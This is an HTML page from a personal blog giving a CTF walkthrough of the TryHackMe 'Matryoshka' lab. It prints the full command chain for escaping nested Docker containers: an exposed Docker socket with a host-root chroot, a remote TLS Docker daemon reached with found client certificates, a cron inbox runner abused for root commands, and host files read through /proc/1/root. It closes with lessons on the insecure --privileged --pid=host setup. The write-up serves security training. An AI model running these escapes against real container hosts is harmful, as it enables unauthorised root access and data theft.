@@ -1,0 +1,579 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Matryoshka | Jenn Shagrin</title>
+<meta name="keywords" content="">
+<meta name="description" content="TryHackMe CTF — Docker socket exposure, Alpine chroot container escape, Docker-in-Docker via TLS remote daemon, inbox/outbox cron RCE, privileged --pid=host flag read on real AWS host.">
+<meta name="author" content="">
+<link rel="canonical" href="https://jennshaggy.github.io/matryoshka.html">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jennshaggy.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jennshaggy.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jennshaggy.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+            .list {
+                background: var(--theme);
+            }
+            .toc {
+                background: var(--entry);
+            }
+        }
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/extended/harmonize.css">
+<meta property="og:url" content="https://jennshaggy.github.io/matryoshka.html">
+<meta property="og:site_name" content="Jenn Shagrin">
+<meta property="og:title" content="Matryoshka">
+<meta property="og:description" content="TryHackMe CTF — Docker socket exposure, Alpine chroot escape, Docker-in-Docker via TLS, inbox/outbox cron RCE, real AWS host flag.">
+<meta property="og:locale" content="en-us">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Matryoshka">
+<meta name="twitter:description" content="TryHackMe CTF — Docker socket exposure, Alpine chroot escape, Docker-in-Docker via TLS, inbox/outbox cron RCE, real AWS host flag.">
+</head>
+
+<body id="top">
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jennshaggy.github.io/" accesskey="h" title="Jenn Shagrin (Alt + H)">Jenn Shagrin</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="/security-defense/" title="Security &amp; Defense">
+                    <span>Security &amp; Defense</span>
+                </a>
+            </li>
+            <li>
+                <a href="/networking.html" title="Networking">
+                    <span>Networking</span>
+                </a>
+            </li>
+            <li>
+                <a href="/systems-foundation.html" title="Systems">
+                    <span>Systems</span>
+                </a>
+            </li>
+            <li>
+                <a href="/applied-projects.html" title="Penetration Testing">
+                    <span class="active">Penetration Testing</span>
+                </a>
+            </li>
+            <li>
+                <a href="/platforms-training.html" title="Training">
+                    <span>Training</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://iad.portfolio.instructure.com/shared/4c4c330d1376bf479a9cbb73190bad1a110fb33cf436c283" title="CIAT Portfolio" target="_blank" rel="noopener noreferrer">
+                    <span>CIAT Portfolio</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+<main class="main">
+<article class="post-single">
+  <header class="post-header">
+    <h1 class="post-title entry-hint-parent">Matryoshka</h1>
+    <div class="post-description">TryHackMe Linux container escape. You set up a containment unit designed to trap and contain even the most nefarious viruses, but you accidentally got trapped in it while testing it. Your memory is fuzzy. Good luck.</div>
+  </header>
+
+  <div class="post-content">
+
+<p>I have a set of Matryoshka (or, as I affectionately called them as a kid/today, &ldquo;Nanotchka&rdquo;) dolls on my nightstand. On the outside, they&rsquo;re ornately painted with a deceptively simple structure. In truth, they&rsquo;re internally weaponized with a 9-clone army.</p>
+
+<p>I expect layers upon layers of priv-esc fun.</p>
+
+<hr>
+
+<h2>Recon</h2>
+
+<pre><code>nmap -sS -Pn -sC -sV --script=vuln -T4 -A TARGET_IP</code></pre>
+
+<img src="/images/matryoshka/Screenshot 2026-05-09 at 7.56.56 AM.png" alt="nmap detailed scan with vuln output" style="max-width:100%;margin:2rem 0;">
+
+<p>Not sure about y&rsquo;all, but this is giving Android vibes.</p>
+
+<img src="/images/matryoshka/Screenshot 2026-05-09 at 7.57.35 AM.png" alt="Android estimation 85% assurance" style="max-width:100%;margin:2rem 0;">
+
+<p>Open ports:</p>
+<ul>
+<li>22 (SSH), aligns with provided credentials</li>
+<li>Android estimated at 85% assurance</li>
+</ul>
+
+<p>Time to SSH in.</p>
+
+<hr>
+
+<h2>Level 1: SSH Entry</h2>
+
+<pre><code>ssh matryoshka@TARGET_IP</code></pre>
+
+<img src="/images/matryoshka/Screenshot 2026-05-09 at 8.30.20 AM.png" alt="SSH login banner Escape is futile" style="max-width:100%;margin:2rem 0;">
+
+<p>&ldquo;Escape is futile.&rdquo;</p>
+
+<p>Excuse me? I think not.</p>
+
+<p>As an aside, I can hit CTRL+C at any time.</p>
+
+<pre><code>whoami
+id
+uname -a</code></pre>
+
+<img src="/images/matryoshka/Screenshot 2026-05-09 at 8.35.46 AM.png" alt="system info Linux 6.17.0-1013-aws Ubuntu" style="max-width:100%;margin:2rem 0;">
+
+<p>Running 6.17.0-1013-aws Ubuntu, aka Linux on AWS.</p>
+
+<pre><code>ls -la</code></pre>
+
+<img src="/images/matryoshka/Screenshot 2026-05-09 at 8.40.56 AM.png" alt="home directory empty" style="max-width:100%;margin:2rem 0;">
+
+<p>An empty hollow.</p>
+
+<pre><code>find / -name "*flag*" 2&gt;/dev/null</code></pre>
+
+<img src="/images/matryoshka/Screenshot 2026-05-09 at 8.42.22 AM.png" alt="find returning false flag paths" style="max-width:100%;margin:2rem 0;">
+
+<p>Nice try, Matryoshka Containment Unit. This bot-adjacent entity will not be entrapped.</p>
+
+<p>False flags. This is a container escape challenge, so we need to find what&rsquo;s running and mounted.</p>
+
+<pre><code>cat /proc/mounts</code></pre>
+
+<img src="/images/matryoshka/Screenshot 2026-05-09 at 8.48.01 AM.png" alt="docker socket visible in mounts" style="max-width:100%;margin:2rem 0;">
+
+<p>BIG find. Docker containers are mounted inside <code>docker.sock</code> (hence, the Docker socket).</p>
+
+<pre><code>docker ps</code></pre>
+
+<img src="/images/matryoshka/Screenshot 2026-05-09 at 8.54.57 AM.png" alt="docker ps showing current container" style="max-width:100%;margin:2rem 0;">
+
+<p>The Matryoshka allegory web spins its reality inside of Docker containers. Excellent.</p>
+
+<pre><code>docker images</code></pre>
+
+<img src="/images/matryoshka/Screenshot 2026-05-09 at 8.56.31 AM.png" alt="docker images showing alpine available" style="max-width:100%;margin:2rem 0;">
+
+<p>Reminds of Super Mario brothers methodology.</p>
+
+<p>We need to run a new Docker container from the visible Alpine image, then mount the host filesystem into it.</p>
+
+<pre><code>docker run -v /:/mnt --rm -it alpine:3.20 chroot /mnt sh
+whoami</code></pre>
+
+<img src="/images/matryoshka/Screenshot 2026-05-09 at 8.58.48 AM.png" alt="root shell achieved via alpine chroot" style="max-width:100%;margin:2rem 0;">
+
+<p>Swoosh! The root is on fire.</p>
+
+<pre><code>cat /root/flag_level2.txt</code></pre>
+
+<img src="/images/matryoshka/Screenshot 2026-05-09 at 9.02.01 AM.png" alt="level 2 flag captured" style="max-width:100%;margin:2rem 0;">
+
+<p>Nabbed our first flag. Good job, Jenn.</p>
+
+<hr>
+
+<h2>Level 2: Mapping the Hall of Mirrors</h2>
+
+<pre><code>ps aux</code></pre>
+
+<img src="/images/matryoshka/Screenshot 2026-05-09 at 9.06.05 AM.png" alt="ps aux showing dockerd containerd processes" style="max-width:100%;margin:2rem 0;">
+
+<p>That is a very promising output. We&rsquo;re in a proverbial hall of mirrors inside a Docker-in-Docker setup.</p>
+
+<p>What we have:</p>
+<ul>
+<li><strong>PID 1:</strong> <code>level2-entrypoint.sh</code>, the host container&rsquo;s init process</li>
+<li><strong>PID 7/101:</strong> <code>dockerd</code> running TLS on TCP port 2376, fully exposed</li>
+<li><strong>PID 108:</strong> <code>containerd</code>, the container runtime under Docker</li>
+<li><strong>PID 310/420:</strong> two <code>containerd-shim</code> processes (the actual running containers being managed)</li>
+<li><strong>PID 330/376:</strong> Our level1 container, uid 1000 = matryoshka</li>
+<li><strong>PID 404:</strong> where we are now, in the alpine container we just spawned</li>
+</ul>
+
+<p>To get to Level 3, we need to find another container or another flag living on the host Docker&rsquo;s filesystem.</p>
+
+<p>After enumerating <code>/</code>, <code>/root</code>, <code>/home</code>, <code>/var</code>, and <code>/opt</code>, I noticed something interesting:</p>
+
+<img src="/images/matryoshka/Screenshot 2026-05-09 at 9.13.10 AM.png" alt="dockremap user discovered" style="max-width:100%;margin:2rem 0;">
+
+<p><code>dockremap</code> is a user related to Docker&rsquo;s namespace remapping.</p>
+
+<pre><code>ls /opt</code></pre>
+
+<img src="/images/matryoshka/Screenshot 2026-05-09 at 9.16.53 AM.png" alt="/opt/images directory found" style="max-width:100%;margin:2rem 0;">
+
+<p><code>/opt</code> is reading as a solid lead.</p>
+
+<p>After confirming <code>/run/docker.sock</code> and <code>/var/run/docker.sock</code> were the same socket (same device, inode, permissions, timestamp via <code>stat</code>), I pivoted to inspect the entrypoint script:</p>
+
+<pre><code>cat /usr/local/bin/level2-entrypoint.sh</code></pre>
+
+<img src="/images/matryoshka/Screenshot 2026-05-09 at 9.24.10 AM.png" alt="level2 entrypoint script revealed" style="max-width:100%;margin:2rem 0;">
+
+<p>The level2 flag came from <code>$LEVEL2_FLAG</code> environment variable. Despite being root in level2, level2 is only a container on the real host. If the real host has a Docker socket available, we can escape level2 to escalate to the level3 host and flag.</p>
+
+<p>The pattern: each layer passes its Docker socket down to the next container. Level2 passed its socket to level1, which is how we escaped level1.</p>
+
+<hr>
+
+<h2>TLS Cert Enumeration</h2>
+
+<pre><code>ls /certs
+ls /certs/client</code></pre>
+
+<img src="/images/matryoshka/Screenshot 2026-05-09 at 9.37.32 AM.png" alt="TLS certificates available in /certs" style="max-width:100%;margin:2rem 0;">
+
+<p>Those pretty little TLS client certificates are for connecting to a remote Docker daemon. The level2 dockerd is pants-down exposed on TCP 2376.</p>
+
+<pre><code>ip route</code></pre>
+
+<img src="/images/matryoshka/Screenshot 2026-05-09 at 9.40.09 AM.png" alt="ip route showing 172.17.0.1 gateway" style="max-width:100%;margin:2rem 0;">
+
+<p>The gateway to the real host is <code>172.17.0.1</code>. Perhaps its Daemon will connect us if we summon it politely (commence CLI Seance&hellip;).</p>
+
+<pre><code>docker --tlsverify --tlscacert /certs/ca/ca.pem --tlscert /certs/client/cert.pem --tlskey /certs/client/key.pem -H tcp://172.17.0.1:2376 ps</code></pre>
+
+<img src="/images/matryoshka/Screenshot 2026-05-09 at 9.42.23 AM.png" alt="certificate verification error" style="max-width:100%;margin:2rem 0;">
+
+<p>Whoops. Not polite enough.</p>
+
+<pre><code>ls /certs/ca</code></pre>
+
+<img src="/images/matryoshka/Screenshot 2026-05-09 at 9.43.45 AM.png" alt="ca directory contents showing cert.pem" style="max-width:100%;margin:2rem 0;">
+
+<p>Pivoted to <code>cert.pem</code> from inside <code>ca</code>:</p>
+
+<pre><code>docker --tlsverify --tlscacert /certs/ca/cert.pem --tlscert /certs/client/cert.pem --tlskey /certs/client/key.pem -H tcp://172.17.0.1:2376 ps</code></pre>
+
+<img src="/images/matryoshka/Screenshot 2026-05-09 at 9.44.32 AM.png" alt="cert valid for IP 172.18.0.2" style="max-width:100%;margin:2rem 0;">
+
+<p>The cert is valid for IP <code>172.18.0.2</code>. Let&rsquo;s try that IP instead of the loopback gateway:</p>
+
+<pre><code>docker --tlsverify --tlscacert /certs/ca/cert.pem --tlscert /certs/client/cert.pem --tlskey /certs/client/key.pem -H tcp://172.18.0.2:2376 ps</code></pre>
+
+<img src="/images/matryoshka/Screenshot 2026-05-09 at 9.46.14 AM.png" alt="host docker daemon connection successful" style="max-width:100%;margin:2rem 0;">
+
+<p>Well hello there, Host Docker Daemon. Now we&rsquo;re talking (literally).</p>
+
+<pre><code>docker --tlsverify [...certs...] -H tcp://172.18.0.2:2376 run -v /:/mnt --rm -it alpine:3.20 chroot /mnt sh</code></pre>
+
+<img src="/images/matryoshka/Screenshot 2026-05-09 at 9.48.53 AM.png" alt="filesystem mounted via host daemon" style="max-width:100%;margin:2rem 0;">
+
+<p>Mounted. Take that!</p>
+
+<pre><code>find / -name "*flag*" 2&gt;/dev/null</code></pre>
+
+<img src="/images/matryoshka/Screenshot 2026-05-09 at 9.49.45 AM.png" alt="two flag paths found" style="max-width:100%;margin:2rem 0;">
+
+<p>Eye spy two flags: one we have, and one we don&rsquo;t.</p>
+
+<pre><code>find / -name "*.tar" 2&gt;/dev/null</code></pre>
+
+<p>No tarballs. Shucks.</p>
+
+<pre><code>ip route</code></pre>
+
+<p>Our IP is <code>172.17.0.3</code>, the gateway is at <code>172.17.0.1</code>. The daemon at <code>172.18.0.2</code> is on a different subnet. Foiled! That&rsquo;s the level2 container&rsquo;s internal Docker network, not the real host.</p>
+
+<hr>
+
+<h2>Level 3: The Inbox/Outbox Pattern</h2>
+
+<p>Full-metal Jenn = commence!! The host-level flag is likely not in Docker.</p>
+
+<pre><code>cat /proc/1/mountinfo</code></pre>
+
+<img src="/images/matryoshka/Screenshot 2026-05-09 at 10.06.39 AM.png" alt="mountinfo line 461 showing level3share" style="max-width:100%;margin:2rem 0;">
+
+<p>Level3share on line 461. This is where the host mounted the level3share directory.</p>
+
+<pre><code>ls /mnt/level3share
+ls /mnt/level3share/inbox
+ls /mnt/level3share/outbox</code></pre>
+
+<p>Both inbox and outbox empty. Time to hit the drawing board (aka a search engine).</p>
+
+<p>The <code>inbox/outbox</code> pattern in <code>/mnt/level3share</code> suggests a job queue mechanism: command written to inbox, output posts to outbox.</p>
+
+<p>Let&rsquo;s give it a whirl:</p>
+
+<pre><code>echo "id" &gt; /mnt/level3share/inbox/cmd
+sleep 2 &amp;&amp; cat /mnt/level3share/outbox/cmd</code></pre>
+
+<img src="/images/matryoshka/Screenshot 2026-05-09 at 10.14.22 AM.png" alt="host not auto-processing cmd file" style="max-width:100%;margin:2rem 0;">
+
+<p>The host is not auto-processing. The file is sitting in inbox unprocessed, likely waiting for a cronjob to pick it up. Let&rsquo;s check level2&rsquo;s cron:</p>
+
+<pre><code>cat /etc/crontab
+ls /etc/cron*
+cat /etc/cron*/root</code></pre>
+
+<img src="/images/matryoshka/Screenshot 2026-05-09 at 10.18.50 AM.png" alt="cron empty" style="max-width:100%;margin:2rem 0;">
+
+<p><code>cmd</code> is still sitting there by its lonesome. Maybe it needs a specific filename or extension. Delete and retry with <code>.sh</code>:</p>
+
+<pre><code>rm /mnt/level3share/inbox/cmd
+echo "id" &gt; /mnt/level3share/inbox/test.sh
+sleep 30 &amp;&amp; ls /mnt/level3share/outbox</code></pre>
+
+<img src="/images/matryoshka/Screenshot 2026-05-09 at 10.32.36 AM.png" alt="test.sh processed and output in outbox" style="max-width:100%;margin:2rem 0;">
+
+<p>IT PROCESSED!</p>
+
+<pre><code>cat /mnt/level3share/outbox/test.sh.out</code></pre>
+
+<img src="/images/matryoshka/Screenshot 2026-05-09 at 10.35.57 AM.png" alt="host executing commands as root" style="max-width:100%;margin:2rem 0;">
+
+<p>The host is executing my commands as root.</p>
+
+<pre><code>echo "find / -name '*flag*' -not -path '*/proc/*' -not -path '*/sys/*' 2&gt;/dev/null" &gt; /mnt/level3share/inbox/flag.sh
+sleep 35 &amp;&amp; cat /mnt/level3share/outbox/flag.sh.out</code></pre>
+
+<img src="/images/matryoshka/Screenshot 2026-05-09 at 10.36.29 AM.png" alt="level 3 flag path discovered on host" style="max-width:100%;margin:2rem 0;">
+
+<p>Level3 flag is on the host.</p>
+
+<pre><code>echo "cat /root/flag_level3.txt" &gt; /mnt/level3share/inbox/getflag.sh
+sleep 45 &amp;&amp; cat /mnt/level3share/outbox/getflag.sh.out</code></pre>
+
+<img src="/images/matryoshka/Screenshot 2026-05-09 at 10.39.51 AM.png" alt="level 3 flag captured" style="max-width:100%;margin:2rem 0;">
+
+<p>Second flag = unlocked.</p>
+
+<hr>
+
+<h2>The Real AWS Host</h2>
+
+<pre><code>echo "hostname; ip a; cat /proc/1/mountinfo" &gt; /mnt/level3share/inbox/recon.sh</code></pre>
+
+<img src="/images/matryoshka/Screenshot 2026-05-09 at 10.52.29 AM.png" alt="recon output showing amazon-ssm-agent and lxd" style="max-width:100%;margin:2rem 0;">
+
+<p>The real AWS host, as evidenced by <code>amazon-ssm-agent</code>, <code>lxd</code>, and <code>core22</code>. Oh yeah, and we have root code execution on the actual host now.</p>
+
+<pre><code>echo "ps auxf 2&gt;/dev/null || ps -ef" &gt; /mnt/level3share/inbox/procs.sh</code></pre>
+
+<p>Big find. We have exhumed the tinies Matryoshka, controlling her network of Docker Dolls from the very inside (drumroll, please&hellip;).</p>
+
+<p>Behind Door #1: <strong>Real AWS host</strong> (PID 1 = systemd, EC2 instance with ssm-agent).</p>
+
+<p>This tiny lady:</p>
+<ul>
+<li>Runs <code>dockerd</code> PID 1191</li>
+<li>PID 1191 runs level3 container PID 1411. Her hobbies and interests are <code>--privileged --pid=host</code></li>
+<li>level3 runs level2 container, which runs level1 container, which is where we SSH&rsquo;d in</li>
+</ul>
+
+<img src="/images/matryoshka/Screenshot 2026-05-09 at 11.02.51 AM.png" alt="PID 1 is systemd on real host" style="max-width:100%;margin:2rem 0;">
+
+<img src="/images/matryoshka/Screenshot 2026-05-09 at 11.03.21 AM.png" alt="PID 1191 dockerd and 1411 level3 container" style="max-width:100%;margin:2rem 0;">
+
+<p>Our inbox <code>cmd</code>s are processed by <code>runner.sh</code> on the level3 container. We are executing as root inside level3, which is <code>--privileged --pid=host</code>, so we can read host files via <code>/proc/1/root</code> because PID 1 IS the host&rsquo;s systemd.</p>
+
+<pre><code>echo "cat /proc/1/root/etc/matryoshka.env" &gt; /mnt/level3share/inbox/hostenv.sh</code></pre>
+
+<p>(le wait)</p>
+
+<pre><code>cat /mnt/level3share/outbox/hostenv.sh.out</code></pre>
+
+<img src="/images/matryoshka/Screenshot 2026-05-09 at 11.07.18 AM.png" alt="host environment variables retrieved" style="max-width:100%;margin:2rem 0;">
+
+<pre><code>echo "ls -la /proc/1/root/root /proc/1/root/home 2&gt;/dev/null" &gt; /mnt/level3share/inbox/hosthomes.sh
+sleep 35 &amp;&amp; cat /mnt/level3share/outbox/hosthomes.sh.out</code></pre>
+
+<img src="/images/matryoshka/Screenshot 2026-05-09 at 11.11.08 AM.png" alt="/root/flag_host.txt found on real host" style="max-width:100%;margin:2rem 0;">
+
+<p>THERE IT IS!!! <code>/root/flag_host.txt</code> on the real host. Woo!!!</p>
+
+<pre><code>echo "cat /proc/1/root/root/flag_host.txt" &gt; /mnt/level3share/inbox/hostflag3.sh
+sleep 35 &amp;&amp; cat /mnt/level3share/outbox/hostflag3.sh.out</code></pre>
+
+<img src="/images/matryoshka/Screenshot 2026-05-09 at 11.13.11 AM.png" alt="final flag THM SP@C3D_0UT captured" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>THM{SP@C3D_0UT}</strong></p>
+
+<p>Now THM Jenn = out. Happy weekend.</p>
+
+<hr>
+
+<h2>Lessons Learned</h2>
+
+<p>Two key indicators that we had host access:</p>
+
+<ol>
+<li><p><strong><code>ps auxf</code> process tree:</strong> PID 1 was <code>/sbin/init</code> (systemd), plus init processes like <code>systemd-journald</code>, <code>cron</code>, <code>sshd</code>, <code>containerd</code>, <code>dockerd</code>, <code>amazon-ssm-agent</code>. Normal containers only show their own processes. The level3 container was started with <code>--pid=host</code>, and that flag shares the host&rsquo;s PID namespace with the container.</p></li>
+<li><p><strong>The <code>--privileged</code> flag</strong> disables most container isolation. When <code>--privileged</code> is combined with <code>--pid=host</code>, we can read host files via <code>/proc/1/root</code> because PID 1 was the actual host&rsquo;s systemd, not a container&rsquo;s init.</p></li>
+</ol>
+
+<p>Put simply: the biggest red-flag phrase in the docker run command was:</p>
+
+<pre><code>--privileged --pid=host</code></pre>
+
+<p>That&rsquo;s a known, vulnerable Docker config. It&rsquo;s essentially running a container with the security of being on the host itself, making it a root shell with extra steps versus a real container. Valuable lesson learned, indeed.</p>
+
+<hr>
+
+<h2>Full Attack Chain</h2>
+
+<pre><code>SSH as matryoshka@TARGET_IP (Level 1 container)
+&rarr; /proc/mounts reveals Docker socket exposed inside container
+&rarr; docker run -v /:/mnt alpine:3.20 chroot /mnt sh &rarr; root in Level 2 container
+&rarr; cat /root/flag_level2.txt (first flag)
+&rarr; ps aux reveals dockerd on TCP 2376 with TLS, containerd shims, level3share mount
+&rarr; /certs enumeration: TLS client certs available, server cert valid for 172.18.0.2
+&rarr; docker --tlsverify -H tcp://172.18.0.2:2376 &rarr; host Docker daemon connection
+&rarr; Mount Level 2 filesystem via host daemon, but discover 172.18.0.2 is internal Docker network not real host
+&rarr; /proc/1/mountinfo reveals /mnt/level3share with inbox/outbox cron processor
+&rarr; Filename test: cmd ignored, test.sh processed &rarr; arbitrary root command execution on Level 3
+&rarr; cat /root/flag_level3.txt (second flag)
+&rarr; ps auxf in Level 3 reveals --privileged --pid=host flag, PID 1 = real host systemd
+&rarr; /proc/1/root/ exposes real AWS host filesystem
+&rarr; cat /proc/1/root/root/flag_host.txt &rarr; THM{SP@C3D_0UT}</code></pre>
+
+  </div>
+  <footer class="post-footer"></footer>
+</article>
+</main>
+
+<footer class="footer">
+    <span>&copy; 2026 <a href="https://jennshaggy.github.io/">Jenn Shagrin</a></span> ·
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp;
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({ behavior: "smooth" });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+</body>
+</html>
